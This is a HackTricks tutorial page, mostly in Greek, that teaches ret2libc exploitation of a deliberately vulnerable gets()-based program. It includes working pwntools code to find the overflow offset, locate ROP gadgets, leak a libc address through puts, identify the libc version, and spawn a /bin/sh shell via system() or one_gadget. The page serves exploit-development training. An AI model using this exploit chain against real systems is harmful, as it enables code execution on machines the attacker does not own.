# Leaking libc address with ROP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Quick Resume

1. **Βρείτε** overflow **offset**
2. **Βρείτε** `POP_RDI` gadget, `PUTS_PLT` και `MAIN`
3. Χρησιμοποιήστε τα προηγούμενα gadgets για να **διαρρεύσετε τη διεύθυνση μνήμης** του puts ή άλλης libc συνάρτησης και **βρείτε την έκδοση libc** ([κατεβάστε το](https://libc.blukat.me))
4. Με τη βιβλιοθήκη, **υπολογίστε το ROP και εκμεταλλευτείτε το**

## Other tutorials and binaries to practice

This tutorial is going to exploit the code/binary proposed in this tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Another useful tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Code

Filename: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Leaking LIBC template

Θα χρησιμοποιήσω τον κώδικα που βρίσκεται εδώ για να δημιουργήσω την εκμετάλλευση.\
Κατεβάστε την εκμετάλλευση και τοποθετήστε την στον ίδιο φάκελο με το ευάλωτο δυαδικό αρχείο και δώστε τα απαραίτητα δεδομένα στο σενάριο:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Finding the offset

Το πρότυπο χρειάζεται μια μετατόπιση πριν συνεχίσει με την εκμετάλλευση. Αν παρέχεται οποιαδήποτε, θα εκτελέσει τον απαραίτητο κώδικα για να την βρει (κατά προεπιλογή `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Εκτελέστε** `python template.py` θα ανοίξει μια κονσόλα GDB με το πρόγραμμα να έχει καταρρεύσει. Μέσα σε αυτήν την **κονσόλα GDB** εκτελέστε `x/wx $rsp` για να αποκτήσετε τα **bytes** που θα αντικαθιστούσαν το RIP. Τέλος, αποκτήστε το **offset** χρησιμοποιώντας μια **κονσόλα python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

Αφού βρείτε την απόσταση (σε αυτή την περίπτωση 40) αλλάξτε τη μεταβλητή OFFSET μέσα στο πρότυπο χρησιμοποιώντας αυτή την τιμή.\
`OFFSET = "A" * 40`

Ένας άλλος τρόπος θα ήταν να χρησιμοποιήσετε: `pattern create 1000` -- _εκτελέστε μέχρι το ret_ -- `pattern seach $rsp` από το GEF.

## 2- Εύρεση Gadgets

Τώρα πρέπει να βρούμε ROP gadgets μέσα στο δυαδικό αρχείο. Αυτά τα ROP gadgets θα είναι χρήσιμα για να καλέσουμε το `puts` για να βρούμε τη **libc** που χρησιμοποιείται, και αργότερα για να **εκκινήσουμε την τελική εκμετάλλευση**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Ο `PUTS_PLT` είναι απαραίτητος για να καλέσουμε τη **συνάρτηση puts**.\
Ο `MAIN_PLT` είναι απαραίτητος για να καλέσουμε ξανά τη **κύρια συνάρτηση** μετά από μία αλληλεπίδραση για να **εκμεταλλευτούμε** την υπερχείλιση **ξανά** (άπειροι γύροι εκμετάλλευσης). **Χρησιμοποιείται στο τέλος κάθε ROP για να καλέσει ξανά το πρόγραμμα**.\
Ο **POP\_RDI** είναι απαραίτητος για να **περάσουμε** μια **παράμετρο** στη καλούμενη συνάρτηση.

Σε αυτό το βήμα δεν χρειάζεται να εκτελέσετε τίποτα καθώς όλα θα βρεθούν από το pwntools κατά την εκτέλεση.

## 3- Εύρεση βιβλιοθήκης libc

Τώρα είναι η ώρα να βρούμε ποια έκδοση της **βιβλιοθήκης libc** χρησιμοποιείται. Για να το κάνουμε αυτό, θα **διαρρεύσουμε** τη **διεύθυνση** στη μνήμη της **συνάρτησης** `puts` και στη συνέχεια θα **αναζητήσουμε** σε ποια **έκδοση βιβλιοθήκης** βρίσκεται η έκδοση του puts σε αυτή τη διεύθυνση.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Για να το κάνετε αυτό, η πιο σημαντική γραμμή του εκτελούμενου κώδικα είναι:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Αυτό θα στείλει μερικά bytes μέχρι να είναι δυνατή η **επικάλυψη** του **RIP**: `OFFSET`.\
Στη συνέχεια, θα ρυθμίσει τη **διεύθυνση** του gadget `POP_RDI` έτσι ώστε η επόμενη διεύθυνση (`FUNC_GOT`) να αποθηκευτεί στο **RDI** μητρώο. Αυτό συμβαίνει επειδή θέλουμε να **καλέσουμε το puts** **περνώντας** του τη **διεύθυνση** του `PUTS_GOT` καθώς η διεύθυνση στη μνήμη της συνάρτησης puts αποθηκεύεται στη διεύθυνση που δείχνει το `PUTS_GOT`.\
Μετά από αυτό, θα κληθεί το `PUTS_PLT` (με το `PUTS_GOT` μέσα στο **RDI**) έτσι ώστε το puts να **διαβάσει το περιεχόμενο** μέσα στο `PUTS_GOT` (**η διεύθυνση της συνάρτησης puts στη μνήμη**) και θα **εκτυπώσει**.\
Τέλος, **η κύρια συνάρτηση καλείται ξανά** ώστε να μπορέσουμε να εκμεταλλευτούμε την υπερχείλιση ξανά.

Με αυτόν τον τρόπο έχουμε **παγιδεύσει τη συνάρτηση puts** να **εκτυπώσει** τη **διεύθυνση** στη **μνήμη** της συνάρτησης **puts** (η οποία είναι μέσα στη βιβλιοθήκη **libc**). Τώρα που έχουμε αυτή τη διεύθυνση μπορούμε να **αναζητήσουμε ποια έκδοση libc χρησιμοποιείται**.

![](<../../../../../.gitbook/assets/image (141).png>)

Καθώς **εκμεταλλευόμαστε** κάποιο **τοπικό** δυαδικό, **δεν είναι απαραίτητο** να καταλάβουμε ποια έκδοση της **libc** χρησιμοποιείται (απλώς βρείτε τη βιβλιοθήκη στο `/lib/x86_64-linux-gnu/libc.so.6`).\
Αλλά, σε περίπτωση απομακρυσμένης εκμετάλλευσης, θα εξηγήσω εδώ πώς μπορείτε να το βρείτε:

### 3.1- Αναζητώντας την έκδοση libc (1)

Μπορείτε να αναζητήσετε ποια βιβλιοθήκη χρησιμοποιείται στη σελίδα: [https://libc.blukat.me/](https://libc.blukat.me)\
Θα σας επιτρέψει επίσης να κατεβάσετε την ανακαλυφθείσα έκδοση της **libc**

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- Αναζητώντας την έκδοση libc (2)

Μπορείτε επίσης να κάνετε:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Αυτό θα πάρει λίγο χρόνο, να είστε υπομονετικοί.\
Για να λειτουργήσει αυτό, χρειαζόμαστε:

* Όνομα συμβόλου libc: `puts`
* Διεύθυνση libc που διαρρέει: `0x7ff629878690`

Μπορούμε να καταλάβουμε ποια **libc** είναι πιο πιθανό να χρησιμοποιείται.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Παίρνουμε 2 αντιστοιχίες (θα πρέπει να δοκιμάσετε τη δεύτερη αν η πρώτη δεν λειτουργεί). Κατεβάστε την πρώτη:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Αντιγράψτε τη libc από `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` στον κατάλογο εργασίας μας.

### 3.3- Άλλες συναρτήσεις για leak
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Εύρεση διεύθυνσης libc βάσει & εκμετάλλευση

Σε αυτό το σημείο θα πρέπει να γνωρίζουμε τη βιβλιοθήκη libc που χρησιμοποιείται. Καθώς εκμεταλλευόμαστε ένα τοπικό δυαδικό αρχείο, θα χρησιμοποιήσω απλώς: `/lib/x86_64-linux-gnu/libc.so.6`

Έτσι, στην αρχή του `template.py` αλλάξτε τη μεταβλητή **libc** σε: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Ορίστε τη διαδρομή της βιβλιοθήκης όταν την γνωρίζετε`

Δίνοντας τη **διαδρομή** στη **βιβλιοθήκη libc**, το υπόλοιπο της **εκμετάλλευσης θα υπολογιστεί αυτόματα**.

Μέσα στη συνάρτηση `get_addr`, η **βάση διεύθυνση της libc** θα υπολογιστεί:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Σημειώστε ότι **η τελική διεύθυνση βάσης της libc πρέπει να τελειώνει σε 00**. Αν αυτό δεν ισχύει, μπορεί να έχετε διαρρεύσει μια λανθασμένη βιβλιοθήκη.
{% endhint %}

Στη συνέχεια, η διεύθυνση της συνάρτησης `system` και η **διεύθυνση** της συμβολοσειράς _"/bin/sh"_ θα υπολογιστούν από τη **βάση** της **libc** και θα δοθούν στη **βιβλιοθήκη libc.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Τέλος, η εκμετάλλευση εκτέλεσης /bin/sh πρόκειται να προετοιμαστεί και να σταλεί:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Ας εξηγήσουμε αυτό το τελικό ROP.\
Το τελευταίο ROP (`rop1`) καλέστηκε ξανά τη βασική συνάρτηση, τότε μπορούμε να **εκμεταλλευτούμε ξανά** την **υπερχείλιση** (γι' αυτό ο `OFFSET` είναι εδώ ξανά). Στη συνέχεια, θέλουμε να καλέσουμε `POP_RDI` δείχνοντας στη **διεύθυνση** του _"/bin/sh"_ (`BINSH`) και να καλέσουμε τη συνάρτηση **system** (`SYSTEM`) επειδή η διεύθυνση του _"/bin/sh"_ θα περαστεί ως παράμετρος.\
Τέλος, η **διεύθυνση της συνάρτησης εξόδου** είναι **καλούμενη** ώστε η διαδικασία να **εξέρχεται ωραία** και να μην δημιουργείται καμία ειδοποίηση.

**Με αυτόν τον τρόπο η εκμετάλλευση θα εκτελέσει ένα \_/bin/sh**\_\*\* shell.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- Χρησιμοποιώντας ONE\_GADGET

Μπορείτε επίσης να χρησιμοποιήσετε [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) για να αποκτήσετε ένα shell αντί να χρησιμοποιήσετε **system** και **"/bin/sh". ONE\_GADGET** θα βρει μέσα στη βιβλιοθήκη libc κάποιον τρόπο για να αποκτήσει ένα shell χρησιμοποιώντας μόνο μία **διεύθυνση ROP**.\
Ωστόσο, συνήθως υπάρχουν κάποιες περιορισμοί, οι πιο κοινοί και εύκολοι να αποφευχθούν είναι όπως `[rsp+0x30] == NULL` Καθώς ελέγχετε τις τιμές μέσα στο **RSP** πρέπει απλώς να στείλετε μερικές περισσότερες NULL τιμές ώστε να αποφευχθεί ο περιορισμός.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

Μπορείτε να βρείτε ένα πρότυπο για να εκμεταλλευτείτε αυτήν την ευπάθεια εδώ:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Common problems

### MAIN\_PLT = elf.symbols\['main'] not found

Εάν το σύμβολο "main" δεν υπάρχει. Τότε μπορείτε να βρείτε πού είναι ο κύριος κώδικας:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
και ορίστε τη διεύθυνση χειροκίνητα:
```python
MAIN_PLT = 0x401080
```
### Puts not found

Αν το δυαδικό αρχείο δεν χρησιμοποιεί Puts, θα πρέπει να ελέγξετε αν χρησιμοποιεί

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

Αν βρείτε αυτό το **σφάλμα** μετά τη δημιουργία **όλων** των εκμεταλλεύσεων: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Δοκιμάστε να **αφαιρέσετε 64 bytes από τη διεύθυνση του "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
